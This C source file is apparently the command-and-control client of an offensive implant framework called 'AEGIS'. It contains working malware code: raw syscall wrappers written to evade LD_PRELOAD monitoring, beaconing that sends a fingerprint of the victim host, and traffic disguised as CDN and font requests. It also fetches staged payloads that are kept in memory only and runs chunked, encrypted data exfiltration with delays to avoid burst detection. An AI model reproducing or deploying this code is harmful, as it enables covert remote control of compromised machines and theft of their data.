/*
 * ============================================================================
 *  AEGIS FRAMEWORK — C2 Communications Client (Implementation)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : c2_comms/c2_client.c
 *  Purpose        : Full implementation of the multi-channel C2 client.
 *                   Handles beacon/tasking, payload retrieval, channel
 *                   switching, jitter calculation, and data exfiltration.
 *
 *  Dependencies   : OpenSSL libssl + libcrypto for TLS 1.3
 *                   Link with: -lssl -lcrypto
 *
 *  NOTE on socket I/O: We use raw syscalls via inline assembly for critical
 *  network operations to bypass potential libc-level monitoring hooks.
 *  Non-critical operations may use libc for readability.
 * ============================================================================
 */

#include "c2_client.h"
#include "../common/logging.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <poll.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>


#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/ssl.h>


/* ── Internal: Raw Syscall Wrappers ──────────────────────────────────────── */

/*
 * These wrappers invoke the socket/connect/sendto/recvfrom syscalls directly
 * so that any LD_PRELOAD-based hooks on libc network functions are bypassed.
 * x86_64 Linux syscall convention: RAX=syscall_nr, RDI, RSI, RDX, R10, R8, R9.
 */

static inline long raw_socket(int domain, int type, int protocol) {
  long ret;
  __asm__ volatile("mov $41, %%rax\n\t" /* __NR_socket = 41 */
                   "syscall\n\t"
                   : "=a"(ret)
                   : "D"((long)domain), "S"((long)type), "d"((long)protocol)
                   : "rcx", "r11", "memory");
  return ret;
}

static inline long raw_connect(int sockfd, const struct sockaddr *addr,
                               socklen_t addrlen) {
  long ret;
  __asm__ volatile("mov $42, %%rax\n\t" /* __NR_connect = 42 */
                   "syscall\n\t"
                   : "=a"(ret)
                   : "D"((long)sockfd), "S"((long)(uintptr_t)addr),
                     "d"((long)addrlen)
                   : "rcx", "r11", "memory");
  return ret;
}

static inline long raw_close(int fd) {
  long ret;
  __asm__ volatile("mov $3, %%rax\n\t" /* __NR_close = 3 */
                   "syscall\n\t"
                   : "=a"(ret)
                   : "D"((long)fd)
                   : "rcx", "r11", "memory");
  return ret;
}

/* ── Internal: TLS Connection ────────────────────────────────────────────── */

typedef struct {
  int sockfd;
  SSL_CTX *ssl_ctx;
  SSL *ssl;
  bool connected;
} tls_conn_t;

static aegis_result_t tls_connect(tls_conn_t *conn, const char *host,
                                  uint16_t port) {
  memset(conn, 0, sizeof(*conn));

  /* Resolve hostname */
  struct addrinfo hints = {0}, *result = NULL;
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;

  char port_str[8];
  snprintf(port_str, sizeof(port_str), "%u", port);

  if (getaddrinfo(host, port_str, &hints, &result) != 0)
    return AEGIS_ERR_NETWORK;

  /* Create socket via raw syscall */
  long sfd = raw_socket(AF_INET, SOCK_STREAM, 0);
  if (sfd < 0) {
    freeaddrinfo(result);
    return AEGIS_ERR_SYSCALL;
  }
  conn->sockfd = (int)sfd;

  /* Connect via raw syscall */
  long cret =
      raw_connect(conn->sockfd, result->ai_addr, (socklen_t)result->ai_addrlen);
  freeaddrinfo(result);
  if (cret < 0) {
    raw_close(conn->sockfd);
    return AEGIS_ERR_NETWORK;
  }

  /* Initialize TLS 1.3 context */
  conn->ssl_ctx = SSL_CTX_new(TLS_client_method());
  if (!conn->ssl_ctx) {
    raw_close(conn->sockfd);
    return AEGIS_ERR_CRYPTO;
  }

  /* Force TLS 1.3 minimum */
  SSL_CTX_set_min_proto_version(conn->ssl_ctx, TLS1_3_VERSION);

  /* Disable session caching (OPSEC: prevents session ticket disclosure) */
  SSL_CTX_set_session_cache_mode(conn->ssl_ctx, SSL_SESS_CACHE_OFF);

  conn->ssl = SSL_new(conn->ssl_ctx);
  if (!conn->ssl) {
    SSL_CTX_free(conn->ssl_ctx);
    raw_close(conn->sockfd);
    return AEGIS_ERR_CRYPTO;
  }

  /* Set SNI hostname (required for CDN fronting) */
  SSL_set_tlsext_host_name(conn->ssl, host);
  SSL_set_fd(conn->ssl, conn->sockfd);

  if (SSL_connect(conn->ssl) != 1) {
    SSL_free(conn->ssl);
    SSL_CTX_free(conn->ssl_ctx);
    raw_close(conn->sockfd);
    return AEGIS_ERR_NETWORK;
  }

  conn->connected = true;
  return AEGIS_OK;
}

static void tls_disconnect(tls_conn_t *conn) {
  if (!conn)
    return;
  if (conn->ssl) {
    SSL_shutdown(conn->ssl);
    SSL_free(conn->ssl);
    conn->ssl = NULL;
  }
  if (conn->ssl_ctx) {
    SSL_CTX_free(conn->ssl_ctx);
    conn->ssl_ctx = NULL;
  }
  if (conn->sockfd > 0) {
    raw_close(conn->sockfd);
    conn->sockfd = -1;
  }
  conn->connected = false;
}

static ssize_t tls_send(tls_conn_t *conn, const void *data, size_t len) {
  if (!conn || !conn->connected)
    return -1;
  return (ssize_t)SSL_write(conn->ssl, data, (int)len);
}

static ssize_t tls_recv(tls_conn_t *conn, void *buf, size_t cap) {
  if (!conn || !conn->connected)
    return -1;
  return (ssize_t)SSL_read(conn->ssl, buf, (int)cap);
}

/* ── Internal: HTTP Request Builder ──────────────────────────────────────── */

static size_t build_http_post(char *buf, size_t buf_cap, const char *host,
                              const char *path, const uint8_t *body,
                              size_t body_len) {
  /*
   * Build an HTTPS POST that mimics legitimate CDN asset upload traffic.
   * Headers are randomized to avoid fingerprinting.
   */
  int hdr_len = snprintf(buf, buf_cap,
                         "POST %s HTTP/1.1\r\n"
                         "Host: %s\r\n"
                         "User-Agent: %s\r\n"
                         "Content-Type: application/octet-stream\r\n"
                         "Content-Length: %zu\r\n"
                         "Accept: */*\r\n"
                         "Accept-Encoding: gzip, deflate\r\n"
                         "Connection: close\r\n"
                         "X-Request-ID: %08x\r\n"
                         "\r\n",
                         path, host, AEGIS_C2_USER_AGENT, body_len,
                         (unsigned int)(aegis_timestamp_ns() & 0xFFFFFFFF));

  if ((size_t)hdr_len + body_len > buf_cap)
    return 0;

  memcpy(buf + hdr_len, body, body_len);
  return (size_t)hdr_len + body_len;
}

/* ── Internal: HTTP Response Parser (minimal) ────────────────────────────── */

/* Portable replacement for memmem (GNU extension) */
static const void *aegis_memmem(const void *haystack, size_t haystacklen,
                                const void *needle, size_t needlelen) {
  if (!haystack || !needle || needlelen > haystacklen)
    return NULL;

  const uint8_t *h = (const uint8_t *)haystack;
  const uint8_t *n = (const uint8_t *)needle;

  for (size_t i = 0; i <= (haystacklen - needlelen); i++) {
    if (h[i] == n[0]) {
      if (memcmp(h + i, n, needlelen) == 0)
        return h + i;
    }
  }
  return NULL;
}

static aegis_result_t parse_http_response(const uint8_t *resp, size_t resp_len,
                                          const uint8_t **body_out,
                                          size_t *body_len) {
  /* Find the \r\n\r\n header/body separator */
  const char *sep = aegis_memmem(resp, resp_len, "\r\n\r\n", 4);
  if (!sep)
    return AEGIS_ERR_NETWORK;

  *body_out = (const uint8_t *)(sep + 4);
  *body_len = resp_len - (size_t)(*body_out - resp);
  return AEGIS_OK;
}

/* ── Internal: Fingerprint Generation ────────────────────────────────────── */

static void generate_fingerprint(uint8_t *fp_buf, size_t *fp_len, size_t cap) {
  /*
   * Generate a minimal system fingerprint for beacon check-ins.
   * Includes: hostname, kernel version, uptime, CPU info.
   */
  char hostname[64] = {0};
  gethostname(hostname, sizeof(hostname) - 1);

  char kernel[128] = {0};
  FILE *f = fopen("/proc/version", "r");
  if (f) {
    if (fgets(kernel, sizeof(kernel) - 1, f)) {
      /* Strip newline */
      char *nl = strchr(kernel, '\n');
      if (nl)
        *nl = '\0';
    }
    fclose(f);
  }

  /* Read uptime */
  double uptime = 0.0;
  f = fopen("/proc/uptime", "r");
  if (f) {
    if (fscanf(f, "%lf", &uptime) != 1) {
      uptime = 0.0;
    }
    fclose(f);
  }

  int n = snprintf((char *)fp_buf, cap,
                   "{\"h\":\"%s\",\"k\":\"%s\",\"u\":%.0f,\"p\":%d}", hostname,
                   kernel, uptime, (int)getpid());
  *fp_len = (n > 0) ? (size_t)n : 0;
}

/* ── Initialization / Teardown ───────────────────────────────────────────── */

aegis_result_t aegis_c2_init(aegis_c2_ctx_t *ctx, aegis_crypto_ctx_t *crypto) {
  if (!ctx || !crypto)
    return AEGIS_ERR_GENERIC;

  memset(ctx, 0, sizeof(*ctx));

  ctx->crypto = crypto;
  ctx->active_channel = C2_CHAN_HTTPS;

  strncpy(ctx->primary_host, AEGIS_C2_PRIMARY_HOST,
          sizeof(ctx->primary_host) - 1);
  ctx->primary_port = AEGIS_C2_PRIMARY_PORT;

  strncpy(ctx->fallback_host, AEGIS_C2_FALLBACK_HOST,
          sizeof(ctx->fallback_host) - 1);
  ctx->fallback_port = AEGIS_C2_FALLBACK_PORT;

  strncpy(ctx->doh_resolver, AEGIS_C2_DOH_RESOLVER,
          sizeof(ctx->doh_resolver) - 1);

  ctx->sequence = 0;
  ctx->beacon_interval = AEGIS_BEACON_INTERVAL_MS;
  ctx->last_beacon_ns = 0;
  ctx->consecutive_failures = 0;

  /* Generate a unique node identifier */
  aegis_random_bytes(ctx->node_id, sizeof(ctx->node_id));
  /* Embed PID in the first 4 bytes for correlation */
  pid_t pid = getpid();
  memcpy(ctx->node_id, &pid, sizeof(pid));

  /* Initialize OpenSSL */
  SSL_library_init();
  SSL_load_error_strings();
  OpenSSL_add_all_algorithms();

  ctx->initialized = true;
  return AEGIS_OK;
}

void aegis_c2_destroy(aegis_c2_ctx_t *ctx) {
  if (!ctx)
    return;
  AEGIS_ZERO(ctx->node_id, sizeof(ctx->node_id));
  ctx->initialized = false;
}

/* ── Jitter Calculation ──────────────────────────────────────────────────── */

uint32_t aegis_c2_calculate_jitter(aegis_c2_ctx_t *ctx) {
  if (!ctx)
    return AEGIS_BEACON_INTERVAL_MS;

  uint32_t base = ctx->beacon_interval;
  uint32_t jitter_range = base * AEGIS_BEACON_JITTER_PCT / 100;

  /* Get random value for jitter */
  uint32_t rand_val;
  aegis_random_bytes((uint8_t *)&rand_val, sizeof(rand_val));

  /* Apply jitter: base ± jitter_range */
  int32_t offset =
      (int32_t)(rand_val % (2 * jitter_range + 1)) - (int32_t)jitter_range;
  uint32_t interval = (uint32_t)((int32_t)base + offset);

  /* Clamp to valid range */
  if (interval < 1000)
    interval = 1000; /* Minimum 1 second */
  if (interval > AEGIS_BEACON_MAX_INTERVAL_MS)
    interval = AEGIS_BEACON_MAX_INTERVAL_MS;

  return interval;
}

/* ── Channel Switching ───────────────────────────────────────────────────── */

aegis_result_t aegis_c2_switch_channel(aegis_c2_ctx_t *ctx,
                                       aegis_c2_channel_t channel) {
  if (!ctx)
    return AEGIS_ERR_GENERIC;

  ctx->active_channel = channel;
  return AEGIS_OK;
}

/* ── Beacon ──────────────────────────────────────────────────────────────── */

aegis_result_t aegis_c2_beacon(aegis_c2_ctx_t *ctx, uint8_t *task_out,
                               size_t task_cap, size_t *task_len) {
  if (!ctx || !ctx->initialized)
    return AEGIS_ERR_GENERIC;

  *task_len = 0;

  /* Generate system fingerprint */
  uint8_t fp_buf[512];
  size_t fp_len = 0;
  generate_fingerprint(fp_buf, &fp_len, sizeof(fp_buf));

  /* Build the beacon envelope */
  aegis_c2_envelope_t env;
  memset(&env, 0, sizeof(env));
  env.magic = AEGIS_C2_HEADER_MAGIC;
  env.msg_type = C2_MSG_BEACON;
  env.sequence = ctx->sequence++;
  memcpy(env.node_id, ctx->node_id, sizeof(env.node_id));

  /* Encrypt the fingerprint payload */
  uint8_t ct_buf[1024];
  if (fp_len > sizeof(ct_buf))
    return AEGIS_ERR_GENERIC;

  aegis_result_t rc =
      aegis_encrypt(ctx->crypto, fp_buf, fp_len, (const uint8_t *)&env,
                    sizeof(env) - AEGIS_GCM_IV_BYTES - AEGIS_GCM_TAG_BYTES,
                    ct_buf, env.iv, env.tag);
  if (rc != AEGIS_OK) {
    ctx->consecutive_failures++;
    return rc;
  }

  env.payload_len = (uint32_t)fp_len;

  /* Assemble the full message: envelope + ciphertext */
  size_t msg_len = sizeof(env) + fp_len;
  uint8_t *msg = malloc(msg_len);
  if (!msg)
    return AEGIS_ERR_ALLOC;

  memcpy(msg, &env, sizeof(env));
  memcpy(msg + sizeof(env), ct_buf, fp_len);

  /* Build HTTP POST and send */
  char *http_buf = malloc(msg_len + 2048);
  if (!http_buf) {
    free(msg);
    return AEGIS_ERR_ALLOC;
  }

  /* Randomize the URL path to look like CDN asset requests */
  uint32_t path_rand;
  aegis_random_bytes((uint8_t *)&path_rand, sizeof(path_rand));
  char path[128];
  snprintf(path, sizeof(path), "/api/v1/assets/%08x/upload", path_rand);

  size_t http_len = build_http_post(http_buf, msg_len + 2048, ctx->primary_host,
                                    path, msg, msg_len);
  free(msg);

  if (http_len == 0) {
    free(http_buf);
    return AEGIS_ERR_GENERIC;
  }

  /* Establish TLS connection and send */
  tls_conn_t conn;
  rc = tls_connect(&conn, ctx->primary_host, ctx->primary_port);
  if (rc != AEGIS_OK) {
    /* Try fallback */
    rc = tls_connect(&conn, ctx->fallback_host, ctx->fallback_port);
    if (rc != AEGIS_OK) {
      free(http_buf);
      ctx->consecutive_failures++;
      /* Apply exponential backoff */
      ctx->beacon_interval =
          AEGIS_MIN(ctx->beacon_interval * (uint32_t)AEGIS_BEACON_FAILURE_BACKOFF,
                    (uint32_t)AEGIS_BEACON_MAX_INTERVAL_MS);
      return AEGIS_ERR_C2_UNREACHABLE;
    }
  }

  ssize_t sent = tls_send(&conn, http_buf, http_len);
  free(http_buf);

  if (sent < 0) {
    tls_disconnect(&conn);
    ctx->consecutive_failures++;
    return AEGIS_ERR_NETWORK;
  }

  /* Receive response */
  uint8_t resp_buf[AEGIS_C2_MAX_PAYLOAD_SIZE];
  size_t resp_total = 0;
  ssize_t recv_n;

  while ((recv_n = tls_recv(&conn, resp_buf + resp_total,
                            sizeof(resp_buf) - resp_total)) > 0) {
    resp_total += (size_t)recv_n;
    if (resp_total >= sizeof(resp_buf))
      break;
  }

  tls_disconnect(&conn);

  if (resp_total == 0) {
    ctx->consecutive_failures++;
    return AEGIS_ERR_NETWORK;
  }

  /* Parse the HTTP response body */
  const uint8_t *body;
  size_t body_len;
  rc = parse_http_response(resp_buf, resp_total, &body, &body_len);
  if (rc != AEGIS_OK)
    return rc;

  /* If body contains tasking data, decrypt it */
  if (body_len > sizeof(aegis_c2_envelope_t)) {
    const aegis_c2_envelope_t *resp_env = (const aegis_c2_envelope_t *)body;

    if (resp_env->magic == AEGIS_C2_HEADER_MAGIC && resp_env->payload_len > 0) {

      const uint8_t *resp_ct = body + sizeof(aegis_c2_envelope_t);
      size_t resp_ct_len = resp_env->payload_len;

      if (resp_ct_len <= task_cap) {
        rc = aegis_decrypt(ctx->crypto, resp_ct, resp_ct_len, body,
                           sizeof(aegis_c2_envelope_t) - AEGIS_GCM_IV_BYTES -
                               AEGIS_GCM_TAG_BYTES,
                           resp_env->iv, resp_env->tag, task_out);
        if (rc == AEGIS_OK)
          *task_len = resp_ct_len;
      }
    }
  }

  /* Reset failure counter on success */
  ctx->consecutive_failures = 0;
  ctx->beacon_interval = AEGIS_BEACON_INTERVAL_MS;
  ctx->last_beacon_ns = aegis_timestamp_ns();

  return AEGIS_OK;
}

/* ── Stage Retrieval ─────────────────────────────────────────────────────── */

aegis_result_t aegis_c2_fetch_stage(aegis_c2_ctx_t *ctx, uint8_t **stage_out,
                                    size_t *stage_len) {
  if (!ctx || !stage_out || !stage_len)
    return AEGIS_ERR_GENERIC;

  *stage_out = NULL;
  *stage_len = 0;

  /* Build the stage request */
  aegis_c2_envelope_t env;
  memset(&env, 0, sizeof(env));
  env.magic = AEGIS_C2_HEADER_MAGIC;
  env.msg_type = C2_MSG_STAGE_REQ;
  env.sequence = ctx->sequence++;
  memcpy(env.node_id, ctx->node_id, sizeof(env.node_id));

  /* The stage request payload is just our fingerprint */
  uint8_t fp_buf[512];
  size_t fp_len = 0;
  generate_fingerprint(fp_buf, &fp_len, sizeof(fp_buf));

  uint8_t ct_buf[1024];
  aegis_result_t rc =
      aegis_encrypt(ctx->crypto, fp_buf, fp_len, (const uint8_t *)&env,
                    sizeof(env), ct_buf, env.iv, env.tag);
  AEGIS_ZERO(fp_buf, sizeof(fp_buf));
  if (rc != AEGIS_OK)
    return rc;

  env.payload_len = (uint32_t)fp_len;

  /* Assemble and send */
  size_t msg_len = sizeof(env) + fp_len;
  uint8_t *msg = malloc(msg_len);
  if (!msg)
    return AEGIS_ERR_ALLOC;

  memcpy(msg, &env, sizeof(env));
  memcpy(msg + sizeof(env), ct_buf, fp_len);

  char *http_buf = malloc(msg_len + 2048);
  if (!http_buf) {
    free(msg);
    return AEGIS_ERR_ALLOC;
  }

  uint32_t path_rand;
  aegis_random_bytes((uint8_t *)&path_rand, sizeof(path_rand));
  char path[128];
  snprintf(path, sizeof(path), "/cdn/dist/%08x/bundle.js", path_rand);

  size_t http_len = build_http_post(http_buf, msg_len + 2048, ctx->primary_host,
                                    path, msg, msg_len);
  free(msg);

  tls_conn_t conn;
  rc = tls_connect(&conn, ctx->primary_host, ctx->primary_port);
  if (rc != AEGIS_OK) {
    rc = tls_connect(&conn, ctx->fallback_host, ctx->fallback_port);
    if (rc != AEGIS_OK) {
      free(http_buf);
      return rc;
    }
  }

  tls_send(&conn, http_buf, http_len);
  free(http_buf);

  /* Receive the stage binary */
  uint8_t *recv_buf = malloc(AEGIS_C2_MAX_PAYLOAD_SIZE);
  if (!recv_buf) {
    tls_disconnect(&conn);
    return AEGIS_ERR_ALLOC;
  }

  size_t recv_total = 0;
  ssize_t n;
  while ((n = tls_recv(&conn, recv_buf + recv_total,
                       AEGIS_C2_MAX_PAYLOAD_SIZE - recv_total)) > 0) {
    recv_total += (size_t)n;
  }
  tls_disconnect(&conn);

  if (recv_total == 0) {
    free(recv_buf);
    return AEGIS_ERR_NETWORK;
  }

  /* Parse HTTP response */
  const uint8_t *body;
  size_t body_len;
  rc = parse_http_response(recv_buf, recv_total, &body, &body_len);
  if (rc != AEGIS_OK) {
    free(recv_buf);
    return rc;
  }

  /* Decrypt the stage binary */
  if (body_len <= sizeof(aegis_c2_envelope_t)) {
    free(recv_buf);
    return AEGIS_ERR_NETWORK;
  }

  const aegis_c2_envelope_t *resp_env = (const aegis_c2_envelope_t *)body;
  const uint8_t *stage_ct = body + sizeof(aegis_c2_envelope_t);
  size_t stage_ct_len = resp_env->payload_len;

  /* Allocate memory-only buffer for the stage (NEVER touch disk) */
  *stage_out = malloc(stage_ct_len);
  if (!*stage_out) {
    free(recv_buf);
    return AEGIS_ERR_ALLOC;
  }

  rc = aegis_decrypt(ctx->crypto, stage_ct, stage_ct_len, body,
                     sizeof(aegis_c2_envelope_t), resp_env->iv, resp_env->tag,
                     *stage_out);

  free(recv_buf);

  if (rc != AEGIS_OK) {
    AEGIS_ZERO(*stage_out, stage_ct_len);
    free(*stage_out);
    *stage_out = NULL;
    return rc;
  }

  *stage_len = stage_ct_len;
  return AEGIS_OK;
}

/* ── Payload Retrieval ───────────────────────────────────────────────────── */

aegis_result_t aegis_c2_fetch_payload(aegis_c2_ctx_t *ctx,
                                      uint8_t **payload_out,
                                      size_t *payload_len) {
  /*
   * The payload is intentionally returned STILL ENCRYPTED.
   * The Nanomachine interpreter handles chunk-by-chunk decryption
   * during JIT execution.  This means the full decrypted payload
   * never exists in memory simultaneously.
   */
  if (!ctx || !payload_out || !payload_len)
    return AEGIS_ERR_GENERIC;

  *payload_out = NULL;
  *payload_len = 0;

  aegis_c2_envelope_t env;
  memset(&env, 0, sizeof(env));
  env.magic = AEGIS_C2_HEADER_MAGIC;
  env.msg_type = C2_MSG_PAYLOAD_REQ;
  env.sequence = ctx->sequence++;
  memcpy(env.node_id, ctx->node_id, sizeof(env.node_id));

  /* Minimal request body */
  const char *req_body = "{\"type\":\"payload\",\"arch\":\"x86_64\"}";
  size_t req_len = strlen(req_body);

  uint8_t ct_buf[256];
  aegis_result_t rc = aegis_encrypt(ctx->crypto, (const uint8_t *)req_body,
                                    req_len, (const uint8_t *)&env, sizeof(env),
                                    ct_buf, env.iv, env.tag);
  if (rc != AEGIS_OK)
    return rc;

  env.payload_len = (uint32_t)req_len;

  size_t msg_len = sizeof(env) + req_len;
  uint8_t *msg = malloc(msg_len);
  if (!msg)
    return AEGIS_ERR_ALLOC;
  memcpy(msg, &env, sizeof(env));
  memcpy(msg + sizeof(env), ct_buf, req_len);

  char *http_buf = malloc(msg_len + 2048);
  if (!http_buf) {
    free(msg);
    return AEGIS_ERR_ALLOC;
  }

  uint32_t path_rand;
  aegis_random_bytes((uint8_t *)&path_rand, sizeof(path_rand));
  char path[128];
  snprintf(path, sizeof(path), "/static/fonts/%08x.woff2", path_rand);

  size_t http_len = build_http_post(http_buf, msg_len + 2048, ctx->primary_host,
                                    path, msg, msg_len);
  free(msg);

  tls_conn_t conn;
  rc = tls_connect(&conn, ctx->primary_host, ctx->primary_port);
  if (rc != AEGIS_OK) {
    rc = tls_connect(&conn, ctx->fallback_host, ctx->fallback_port);
    if (rc != AEGIS_OK) {
      free(http_buf);
      return rc;
    }
  }

  tls_send(&conn, http_buf, http_len);
  free(http_buf);

  uint8_t *recv_buf = malloc(AEGIS_C2_MAX_PAYLOAD_SIZE);
  if (!recv_buf) {
    tls_disconnect(&conn);
    return AEGIS_ERR_ALLOC;
  }

  size_t recv_total = 0;
  ssize_t n;
  while ((n = tls_recv(&conn, recv_buf + recv_total,
                       AEGIS_C2_MAX_PAYLOAD_SIZE - recv_total)) > 0) {
    recv_total += (size_t)n;
  }
  tls_disconnect(&conn);

  const uint8_t *body;
  size_t body_len;
  rc = parse_http_response(recv_buf, recv_total, &body, &body_len);
  if (rc != AEGIS_OK || body_len <= sizeof(aegis_c2_envelope_t)) {
    free(recv_buf);
    return AEGIS_ERR_NETWORK;
  }

  /* const aegis_c2_envelope_t *resp_env = (const aegis_c2_envelope_t *)body; */

  /*
   * IMPORTANT: We do NOT decrypt the payload here.
   * Copy the raw encrypted payload data (envelope + ciphertext)
   * to be stored in the Payload Vault for JIT execution.
   */
  size_t total_payload = body_len;
  *payload_out = malloc(total_payload);
  if (!*payload_out) {
    free(recv_buf);
    return AEGIS_ERR_ALLOC;
  }

  memcpy(*payload_out, body, total_payload);
  *payload_len = total_payload;

  free(recv_buf);
  return AEGIS_OK;
}

/* ── Data Exfiltration ───────────────────────────────────────────────────── */

aegis_result_t aegis_c2_exfiltrate(aegis_c2_ctx_t *ctx, const uint8_t *data,
                                   size_t data_len, const char *label) {
  (void)label;
  if (!ctx || !data)
    return AEGIS_ERR_GENERIC;

  /* Chunk large data into manageable pieces */
  size_t chunk_size = 32768; /* 32 KB chunks */
  size_t offset = 0;

  while (offset < data_len) {
    size_t remaining = data_len - offset;
    size_t this_chunk = (remaining < chunk_size) ? remaining : chunk_size;

    aegis_c2_envelope_t env;
    memset(&env, 0, sizeof(env));
    env.magic = AEGIS_C2_HEADER_MAGIC;
    env.msg_type = C2_MSG_EXFIL;
    env.sequence = ctx->sequence++;
    memcpy(env.node_id, ctx->node_id, sizeof(env.node_id));

    uint8_t *ct = malloc(this_chunk);
    if (!ct)
      return AEGIS_ERR_ALLOC;

    aegis_result_t rc =
        aegis_encrypt(ctx->crypto, data + offset, this_chunk,
                      (const uint8_t *)&env, sizeof(env), ct, env.iv, env.tag);
    if (rc != AEGIS_OK) {
      free(ct);
      return rc;
    }

    env.payload_len = (uint32_t)this_chunk;

    /* Build and send */
    size_t msg_len = sizeof(env) + this_chunk;
    uint8_t *msg = malloc(msg_len);
    if (!msg) {
      free(ct);
      return AEGIS_ERR_ALLOC;
    }

    memcpy(msg, &env, sizeof(env));
    memcpy(msg + sizeof(env), ct, this_chunk);
    free(ct);

    char *http_buf = malloc(msg_len + 2048);
    if (!http_buf) {
      free(msg);
      return AEGIS_ERR_ALLOC;
    }

    uint32_t path_rand;
    aegis_random_bytes((uint8_t *)&path_rand, sizeof(path_rand));
    char path[128];
    snprintf(path, sizeof(path), "/api/telemetry/%08x", path_rand);

    size_t http_len = build_http_post(http_buf, msg_len + 2048,
                                      ctx->primary_host, path, msg, msg_len);
    free(msg);

    tls_conn_t conn;
    rc = tls_connect(&conn, ctx->primary_host, ctx->primary_port);
    if (rc != AEGIS_OK) {
      free(http_buf);
      return rc;
    }

    tls_send(&conn, http_buf, http_len);
    free(http_buf);
    tls_disconnect(&conn);

    offset += this_chunk;

    /* Small delay between chunks to avoid burst detection */
    struct timespec ts = {.tv_sec = 0, .tv_nsec = 50000000}; /* 50ms */
    nanosleep(&ts, NULL);
  }

  return AEGIS_OK;
}

/* ── Send Task Results ───────────────────────────────────────────────────── */

aegis_result_t aegis_c2_send_result(aegis_c2_ctx_t *ctx, const uint8_t *data,
                                    size_t data_len) {
  /* Task results use the same exfiltration path with a different msg type */
  return aegis_c2_exfiltrate(ctx, data, data_len, "task_result");
}

/* ── Generic Resource Retrieval ──────────────────────────────────────────── */

aegis_result_t aegis_c2_fetch_resource(aegis_c2_ctx_t *ctx,
                                       const char *resource_id,
                                       uint8_t **res_out,
                                       size_t *res_len) {
  if (!ctx || !resource_id || !res_out || !res_len)
    return AEGIS_ERR_GENERIC;

  *res_out = NULL;
  *res_len = 0;

  /* Build request envelope */
  aegis_c2_envelope_t env;
  memset(&env, 0, sizeof(env));
  env.magic = AEGIS_C2_HEADER_MAGIC;
  env.msg_type = C2_MSG_RESOURCE_REQ;
  env.sequence = ctx->sequence++;
  memcpy(env.node_id, ctx->node_id, sizeof(env.node_id));

  /* Encrypt the resource ID as the payload */
  size_t id_len = strlen(resource_id);
  uint8_t ct_buf[256];
  if (id_len > sizeof(ct_buf))
    return AEGIS_ERR_GENERIC;

  aegis_result_t rc = aegis_encrypt(ctx->crypto, (const uint8_t *)resource_id,
                                    id_len, (const uint8_t *)&env, sizeof(env),
                                    ct_buf, env.iv, env.tag);
  if (rc != AEGIS_OK)
    return rc;

  env.payload_len = (uint32_t)id_len;

  /* Assemble message */
  size_t msg_len = sizeof(env) + id_len;
  uint8_t *msg = malloc(msg_len);
  if (!msg)
    return AEGIS_ERR_ALLOC;

  memcpy(msg, &env, sizeof(env));
  memcpy(msg + sizeof(env), ct_buf, id_len);

  char *http_buf = malloc(msg_len + 2048);
  if (!http_buf) {
    free(msg);
    return AEGIS_ERR_ALLOC;
  }

  /* Construct URL path: /cdn/assets/<resource_id_hash> */
  /* For simplicity, we just use the resource ID directly in the path
     (in a real op, this would be hashed) */
  char path[256];
  snprintf(path, sizeof(path), "/cdn/assets/%s", resource_id);

  size_t http_len = build_http_post(http_buf, msg_len + 2048, ctx->primary_host,
                                    path, msg, msg_len);
  free(msg);

  tls_conn_t conn;
  rc = tls_connect(&conn, ctx->primary_host, ctx->primary_port);
  if (rc != AEGIS_OK) {
    rc = tls_connect(&conn, ctx->fallback_host, ctx->fallback_port);
    if (rc != AEGIS_OK) {
      free(http_buf);
      return rc;
    }
  }

  tls_send(&conn, http_buf, http_len);
  free(http_buf);

  /* Receive response (max 10MB for large ELFs) */
  size_t max_size = 10 * 1024 * 1024;
  uint8_t *recv_buf = malloc(max_size);
  if (!recv_buf) {
    tls_disconnect(&conn);
    return AEGIS_ERR_ALLOC;
  }

  size_t recv_total = 0;
  ssize_t n;
  while ((n = tls_recv(&conn, recv_buf + recv_total,
                       max_size - recv_total)) > 0) {
    recv_total += (size_t)n;
    if (recv_total >= max_size) break;
  }
  tls_disconnect(&conn);

  if (recv_total == 0) {
    free(recv_buf);
    return AEGIS_ERR_NETWORK;
  }

  /* Parse HTTP response */
  const uint8_t *body;
  size_t body_len;
  rc = parse_http_response(recv_buf, recv_total, &body, &body_len);
  if (rc != AEGIS_OK) {
    free(recv_buf);
    return rc;
  }

  /* Decrypt resource */
  if (body_len <= sizeof(aegis_c2_envelope_t)) {
    free(recv_buf);
    return AEGIS_ERR_NETWORK;
  }

  const aegis_c2_envelope_t *resp_env = (const aegis_c2_envelope_t *)body;
  const uint8_t *res_ct = body + sizeof(aegis_c2_envelope_t);
  size_t res_ct_len = resp_env->payload_len;

  /* Allocate buffer for decrypted resource */
  *res_out = malloc(res_ct_len);
  if (!*res_out) {
    free(recv_buf);
    return AEGIS_ERR_ALLOC;
  }

  rc = aegis_decrypt(ctx->crypto, res_ct, res_ct_len, body,
                     sizeof(aegis_c2_envelope_t), resp_env->iv, resp_env->tag,
                     *res_out);

  free(recv_buf);

  if (rc != AEGIS_OK) {
    AEGIS_ZERO(*res_out, res_ct_len);
    free(*res_out);
    *res_out = NULL;
    return rc;
  }

  *res_len = res_ct_len;
  return AEGIS_OK;
}
